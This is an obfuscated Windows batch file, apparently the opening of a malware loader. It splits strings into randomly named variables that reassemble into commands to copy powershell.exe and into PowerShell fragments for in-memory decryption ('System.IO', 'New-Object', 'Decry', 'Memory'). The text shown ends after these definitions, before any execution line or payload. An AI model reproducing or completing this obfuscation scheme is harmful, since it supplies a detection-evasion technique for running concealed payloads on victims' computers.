@echo off
set "SstzbDvSpT=we"
set "qgWRFMhrzh=Sy"
set "QiKjwjMcZF=\v"
set "ZwKFTmaadZ=ws"
set "ypqhFPEDOd=ow"
set "FGKtoclfzg=co"
set "HndHSLwsfM=\W"
set "MOJEmBUTop=nd"
set "FApxjIjJFM=py"
set "CXQWNFNEfp=rS"
set "nRxPzfTPYs=y "
set "lzXhVnfeZY=he"
set "WPNOqHdlDq=ll"
set "QeRlrYizBj=do"
set "lBMAAsWmyB=st"
set "xrSqXMkcFg=0\"
set "niSGfYKIAa=s\"
set "gDYMlsctLN=Po"
set "DHAQntlyWx=ll"
set "leLQeYDWOr= C"
set "cykZBmzagc=in"
set "kTQGUKUlWZ=.e"
set "ExnwBsulDO=1."
set "HmtdqeHwZX=Wi"
set "ZJwSdcvxXy=he"
set "CCbPydPNKM=po"
set "zeHVKDVdzn=em"
set "desOuEqQCz= /"
set "AdfuuzCqmY=we"
set "NvAaNRGmqs=xe"
set "mRHPTzptmJ=rs"
set "BQVLIgvaQZ=:\"
set "QmtnZrszBS=32"
set "JitBEgXZSD=cd"
set "qEJxnfqjdg= %~dp0"
set "vYvWEpHDPE=ecry"
set "HenHYCjSCx=mory"
set "LKqTKAmZef=i) {"
set "uXahXixHMF=n ''"
set "PNnIODlMYY=m.IO"
set "cxdFajfXZO=zHhH"
set "TcWBNuhrHS=:('g"
set "ibbVDiDDiD=ew-O"
set "kJIsqnhqPP=NJ.I"
set "oNuFLOxfUw=nirt"
set "bQUcPaHePK=bjec"
set "tzisedLesC=t Sy"
set "QficswxjxC=);$T"
set "LoBjCNVUsj=rity"
set "mjOdByCQNR=]::N"
set "OwinrgNloY=PxEW"
set "EYWpOzGGYv=gMod"
set "psPZmsxXGK=rAMf"
set "HEcsLpGnwn=tem."
set "qfYeajtsSQ=dj0C"
